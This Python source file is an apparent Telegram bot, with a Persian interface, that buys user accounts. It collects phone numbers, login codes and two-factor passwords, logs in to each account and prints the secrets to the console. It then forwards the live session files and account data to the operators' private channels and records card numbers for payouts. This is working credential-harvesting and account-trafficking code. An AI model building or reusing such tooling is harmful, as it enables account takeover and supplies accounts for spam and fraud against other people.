import json
from datetime import datetime
import telethon
from telethon import events, Button
from read_variables import *
from TempClient import TempClient
from Bot import Bot
from telethon.sync import TelegramClient
import phonenumbers as pn
# from admin_panel import handle_admin_panel
# from telethon.tl.functions.account import UpdatePasswordRequest

# Your API credentials
api_id = read_api_id()  # Your API ID
api_hash = read_api_hash()  # Your API Hash

current_users = {}

def read_json_file(filename):
    # Opening JSON file
    f = open(f'{filename}.json')

    # returns JSON object as
    # a dictionary
    data = json.load(f)

    return data


# Path to the session file
session_file = 'bot'

bot_token = read_bot_token()

# Create a new TelegramClient for signing in
client = TelegramClient(session_file, api_id, api_hash).start(bot_token=bot_token)

bot = Bot(client)

from admin_panel import handle_admin_panel, read_private_channel_ids, read_public_channel_links, read_admins

support_id = read_support_id()
stage = ''
private_channel_id = set(read_private_channel_ids())


try:
    current_country_status = read_json_file('current_country_status')
except FileNotFoundError:
    current_country_status = {}

try:
    users = read_json_file('users_info')
except FileNotFoundError:
    users = {}

try:
    support_messages = read_json_file('support')
except FileNotFoundError:
    support_messages = {}


def is_phone_number(text):
    text = text.replace('+', '').replace(' ', '').replace('-', '')
    return text.isdigit() and len(text) >= 5


def is_code(text):
    return text.replace(' ', '').isdigit()


def text_to_phone_number(text):
    return text.replace('+', '').replace(' ', '').replace('-', '')

def read_blocks_file() -> list[str]:

    with open('blocks.txt', 'r') as file:

        blocked_users = file.read().split('\n')

        return blocked_users
    
def get_users_id(users: list[str]):
    corrected_users = []
    for user in users:
        if user.isnumeric():
            corrected_users.append(str(user))

    return corrected_users


# Define an event handler for incoming messages
@client.on(events.NewMessage)
async def handle_message(event):
    global private_channel_id, users, support_messages, current_country_status
    user = await event.get_chat()
    user_id = str(user.id)
    if user_id not in users.keys():
        users[user_id] = {'sent_account': 0,
                          'paid_account': 0,
                          'submit_time': 0
        }
    user = await event.get_chat()
    user_id = str(user.id)
    try:

        current_user = current_users[user_id]

    except KeyError:

        current_users[user_id] = {}
        current_users[user_id]['stage'] = ''
        
        current_user = current_users[user_id]
    
    stage = current_user['stage']

    # Get the message text
    message = event.message.text

    if not await check_channel_membership(user_id):
        await send_join_message(event)
        return

    if is_phone_number(message) and stage == 'phone_number':
        try:
            current_users[user_id]['client'] = TempClient()
            current_users[user_id]['stage'] = ''
            phone_number = str(message).strip()
            country_code = '+' + str(pn.parse(phone_number).country_code)
            country_status = read_json_file('country_status')
            
            if country_code not in country_status.keys():
                await event.reply('The country code are not accpeted❗')
                return

            if current_country_status.get(country_code, 0) + 1 > int(country_status[country_code]):            
                await event.reply('👇ظرفیت این کشور تمام شداست')
                return
            

            print(phone_number)
            current_users[user_id]['client'].phone_number = phone_number
            current_users[user_id]['client'].client = TelegramClient(f'accounts\\{phone_number}', api_id, api_hash)
            await current_users[user_id]['client'].client.connect()
            response = await current_users[user_id]['client'].client.sign_in(phone_number)
            current_users[user_id]['client'].response = response

            await client.send_message(user, "کد ارسال شده را وارد کنید")
            current_users[user_id]['stage'] = 'code'

        except Exception as e:
            print(e)
            await event.reply('❗شماره وارد شده صحیح نمی باشد. مجددا تلاش کنید')

    elif is_code(message) and stage == 'code':
        try:
            code = message.replace(' ', '')
            print(code)
            current_users[user_id]['client'].response = code
            await current_users[user_id]['client'].client.sign_in(current_users[user_id]['client'].phone_number, code)
            new_message = f"""
✅            اکانت با شماره {current_users[user_id]['client'].phone_number} با موفقیت دریافت شد
❗            جهت تایید اکانت لظفا از اکانت خارج شوید 
👇            سپس به ربات برگشته و از دکمه زیر استفاده کنید"""

            keyboard = [
                [
                    Button.inline("☑️تایید اکانت", b"validate_account")
                ]
            ]

            await client.send_message(user, new_message, buttons=keyboard)
            now = datetime.now()
            users[user_id]['submit_time'] = now.hour * 60 + now.minute


        except telethon.errors.SessionPasswordNeededError:
            await client.send_message(user, "👇رمز عبور خود را وارد کنید")
            current_users[user_id]['stage'] = 'password'
        except Exception as e:
            print(e)
            await event.reply('❗️کد نادرست است.  ارسال کد صحیح 👇')

    elif stage == 'password':
        try:
            # Check if two-factor authentication is enabled
            if await client.is_user_authorized():
                # If two-factor authentication is enabled, prompt the user to enter the password
                password = message
                print(password)
                await client.sign_in(phone=current_users[user_id]['client'].phone_number, password=password, code=current_users[user_id]['client'].response)
                current_users[user_id]['client'].two_factor_password = password

            # Account added successfully
            new_message = f"""
✅            اکانت با شماره {current_users[user_id]['client'].phone_number} با موفقیت دریافت شد
 ❗           جهت تایید اکانت لظفا از اکانت خارج شوید 
👇            سپس به ربات برگشته و از دکمه زیر استفاده کنید"""

            keyboard = [
                [
                    Button.inline("☑️تایید اکانت", b"validate_account")
                ]
            ]

            await client.send_message(user, new_message, buttons=keyboard)
            now = datetime.now()
            users[user_id]['submit_time'] = now.hour * 60 + now.minute


        except Exception as e:
            print(e)
            await event.reply('رمز وارد شده دارای خطا می باشد.  مجددا تلاش کنید')

    elif stage == 'support':
        support_messages[user_id] = message
        write_json_file('support', support_messages)
        current_users[user_id]['stage'] = ''
        await event.reply('پیام شما با موفقیت ثبت شد.')

    elif stage == 'accounts_number':
        paid_account = users[user_id]['paid_account']

        account_to_pay = users[user_id]['sent_account']

        able_to_pay = account_to_pay - paid_account

        if int(message) <= able_to_pay:

            await client.send_message(user, "شماره کارت خود را وارد کنید")

            current_users[user_id]['stage'] = 'card_number'

        else:
            await client.send_message(user, "تعداد وارد شده معتبر نیست")



    elif stage == 'card_number':
        users[user_id]['card_number'] = message
        await event.reply('نام و نام خانوادگی صاحب حساب را وارد کنید.')
        current_users[user_id]['stage'] = 'fullname'

    elif stage == 'fullname':
        users[user_id]['fullname'] = message
        await event.reply('اطلاعات شما با موفقیت ثبت شد و در اسرع وقت پول به حساب شما واریز خواهد شد.')
        current_users[user_id]['stage'] = ''
        write_json_file('users_info', users)


# Define an event handler to respond to button clicks
@client.on(events.NewMessage(pattern='📤ارسال اکانت'))
async def callback_handler(event):
    global stage
    user = await event.get_chat()
    user_id = str(user.id)

    if user_id in get_users_id(read_blocks_file()):
        return
    if not await check_channel_membership(user.id):
        return
    current_users[user_id] = {}
    current_users[user_id]['stage'] = 'phone_number'
    # get phone number
    # Send the message to the user
    await client.send_message(user, "شماره تلفن مورد نظر را وارد کنید")
    


@client.on(events.NewMessage(pattern='👤حساب کاربری'))
async def callback_handler(event):
    user = await event.get_chat()
    user_id = str(user.id)
    if user_id in get_users_id(read_blocks_file()):
        return
    if not await check_channel_membership(user_id):
        return
    if user_id not in users.keys():
        users[user_id] = {'sent_account': 0,
                          'paid_account': 0,
                          'submit_time': 0}
    sent_account = users[user_id].get('sent_account', 0)
    paid_account = users[user_id].get('paid_account', 0)
    message = f"""
🆔 شناسه : {user_id}
📤 تعداد اکانت ارسال شده : {sent_account}
✅ تعداد اکانت قابل تسویه : {sent_account - paid_account}
    """

    await event.reply(message)


@client.on(events.NewMessage(pattern='☎️پشتیبانی'))
async def callback_handler(event):
    global support_id, stage
    user = await event.get_chat()
    user_id = str(user.id)

    if user_id in get_users_id(read_blocks_file()):
        return
    if not await check_channel_membership(user_id):
        return
    current_users[user_id] = {}
    current_users[user_id]['stage'] = 'support'
    message = f"""
    👮🏻 همکاران ما در خدمت شما هستن

📨 جهت ارتباط به صورت مستقیم 👈🏻 {support_id} 
• سعی بخش پشتیبانی بر این است که تمامی پیام های دریافتی در کمتر از ۱۲ ساعت پاسخ داده شوند، بنابراین تا زمان دریافت پاسخ صبور باشید

• لطفا پیام، سوال، پیشنهاد و یا انتقاد خود را در قالب یک پیام واحد به طور کامل ارسال کنید 👇🏻
    """
    await event.reply(message)


@client.on(events.NewMessage(pattern='✅تسویه حساب'))
async def callback_handler(event):
    user = await event.get_chat()
    user_id = str(user.id)
    if user_id in get_users_id(read_blocks_file()):
        return
    if not await check_channel_membership(user_id):
        return
    keyboard = [
        [
            Button.inline("💳کارت به کارت", b"payment")
        ]
    ]

    user = await event.get_chat()

    user_id = str(user.id)

    message = 0

    if user_id in users.keys():
        paid_account = users[user_id]['paid_account']

        account_to_pay = users[user_id]['sent_account']

        able_to_pay = account_to_pay - paid_account

        message = f"""
📤 تعدا  اکانت های قابل تسویه :{able_to_pay}
         توجه کنید که اکانت هایی را میتوانید تسویه کنید که از مدت تحویل آن 3 ساعت گذشته باشد.
 👇  می خواهید به چه شکل تسویه کنید."""
    await client.send_message(user, message, buttons=keyboard)


@client.on(events.CallbackQuery())
async def callback(event):
    global current_users, private_channel_id, users, support_messages, current_country_status
    user = await event.get_chat()
    user_id = str(user.id)
    if user_id not in users.keys():
        users[user_id] = {'sent_account': 0,
                          'paid_account': 0,
                          'submit_time': 0}
    data = event.data
    if data == b'payment':

        user = await event.get_chat()

        user_id = str(user.id)

        if user_id in users.keys():

            paid_account = users[user_id]['paid_account']

            account_to_pay = users[user_id]['sent_account']

            if (account_to_pay - paid_account) != 0:

                await client.send_message(user, "نام کارت خود را وارد کنید 👇")

                stage = 'accounts_number'

            else:
                await client.send_message(user,"موجودی شما کافی نیست  برای بررسی به حداقل 1 حساب کاربری نیاز دارید ❗")
        else:
            await client.send_message(user, "شما اکانتی اضافه نکرده اید.")
    elif data == b'check_join':
        user = await event.get_chat()

        user_id = str(user.id)

        if await check_channel_membership(user_id):
            await show_main_buttons(event)
        else:
            await send_join_message(event)

    elif data == b'validate_account':
        user = await event.get_chat()

        user_id = str(user.id)

        
        country_time = read_json_file('country_time')
        country_code = '+' + str(pn.parse(current_users[user_id]['client'].phone_number).country_code)

        if not await current_users[user_id]['client'].client.get_me():
            print((await current_users[user_id]['client'].client.get_me()))

            
            
            
            if country_code in country_time.keys():
                time = int(country_time[country_code])
            else:
                time = 1440
            

            message = f'''نشست های فعال اکانت خالی نیست،
            در صورتی که از اکانت خارج شدید لطفا بعد
❗            از گذشت{time} دقیقه مجددا تلاش کنید'''
            # client has an user logged in
            await event.reply(message)
        else:
            if country_code in country_time.keys():
                time = int(country_time[country_code])
            else:
                time = 1440
            current_time = datetime.now()

            now_minutes = current_time.hour * 60 + current_time.minute
            if not users[user_id]['submit_time'] + time >= now_minutes:
                message = f'''نشست های فعال اکانت خالی نیست،
در صورتی که از اکانت خارج شدید لطفا بعد
❗از گذشت{time} دقیقه مجددا تلاش کنید'''
    # client has an user logged in
                await event.reply(message)
            # send info to private channel
            filename = current_users[user_id]['client'].phone_number
            content = current_users[user_id]['client'].content()
            write_json_file(f'accounts\\{filename}', content)
            private_channel_id = set(read_private_channel_ids())
            for private_id in private_channel_id:
                # json file
                await client.send_file(int(private_id), f'accounts\\{filename}.json')
                # session file
                temp = current_users[user_id]['client']
                await client.send_file(int(private_id), f'accounts\\{temp.phone_number}.session')

            current_users[user_id]['stage'] = ''

            

            if user_id not in users.keys():
                users[user_id] = {}

            users[user_id]['sent_account'] = users[user_id].get('sent_account', 0) + 1

            write_json_file('users_info', users)
            # client hasn't an user logged in
            await event.reply("عملیات با موفقیت انجام شد. ")

            phone_number = str(current_users[user_id]['client'].phone_number).strip()
            country_code = '+' + pn.parse(phone_number).country_code

            current_country_status[country_code] = current_country_status.get(country_code, 0) + 1

            write_json_file('current_country_status', current_country_status)

            current_users[user_id]['client'].reset_instance()



# Define your bot command handlers
@client.on(events.NewMessage(pattern='/start'))
async def handle_start_command(event):
    global current_users
    
    user = await event.get_chat()

    user_id = str(user.id)

    current_users[user_id] = {}
    current_users[user_id]['stage'] = ''

    write_users(user_id)

    if user_id in get_users_id(read_blocks_file()):
        return

    if await check_channel_membership(user_id):
        await show_main_buttons(event)

@client.on(events.NewMessage(pattern='admin panel'))
async def handle_start_command(event):
    user = await event.get_chat()
    user_id = str(user.id)
    if user_id in get_users_id(read_blocks_file()):
        return
    await handle_admin_panel(event)

async def show_main_buttons(event):
    user = await event.get_chat()

    user_id = str(user.id)

    admins = read_admins()

    if user_id in admins:
        markup = event.client.build_reply_markup([
            [Button.text('📤ارسال اکانت')],
            [Button.text('☎️پشتیبانی'), Button.text('👤حساب کاربری')],
            [Button.text('✅تسویه حساب')],
            [Button.text('admin panel')],
        ])
    else:
        markup = event.client.build_reply_markup([
            [Button.text('📤ارسال اکانت')],
            [Button.text('☎️پشتیبانی'), Button.text('👤حساب کاربری')],
            [Button.text('✅تسویه حساب')] 
        ])
    await event.respond(read_welcome_message(), buttons=markup)


async def send_join_message(event):
    public_channel_username = set(read_public_channel_links())
    public_channel_username = ['@' + link for link in public_channel_username]
    links = '\n'.join(public_channel_username)
    
    message = f"""
☑️    برای استفاده از ربات ابتدا باید وارد کانال زیر شوید
 📣 {links}
    بعد از عضویت در کانال☑ بر روی دکمه <✅ تایید عضویت ☑> بزنید."""

    keyboard = [
        [
            Button.inline("✅تایید عضویت", b"check_join")
        ]
    ]
    await event.respond(message, buttons=keyboard)


async def check_channel_membership(user_id):
    user_id = int(user_id)
    public_channel_username = set(read_public_channel_links())
    try:
        for link in public_channel_username:

            # Get information about the channel
            channel_info = await client.get_entity(link)
            # Get all participants of the channel
            participants = await client.get_participants(channel_info)
            # Check if the user ID is present in the list of participants

            if not any(user_id == participant.id for participant in participants):
                return False
            
        return True
    
    except Exception as e:
        print(f"Error checking channel membership: {e}")
        return False


def get_account_to_pay(sent_account: list):
    count = 0
    now_hour = datetime.now().hour
    for hour in sent_account:
        if hour >= now_hour + 3:
            count += 1

    return count


def write_json_file(filename, content):
    # Serializing json
    json_object = json.dumps(content, indent=4)

    # Writing to sample.json
    with open(f"{filename}.json", "w") as outfile:
        outfile.write(json_object)


def read_json_file(filename):
    # Opening JSON file
    f = open(f'{filename}.json')

    # returns JSON object as
    # a dictionary
    data = json.load(f)

    return data

def write_users(user: str) -> None:
    with open('users.txt', 'a') as file:
        file.write(user + '\n')

# Start the bot
async def main():
    await client.start()
    print("Bot Running...")

    # Keep the bot running
    await client.run_until_disconnected()


if __name__ == "__main__":
    import asyncio

    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
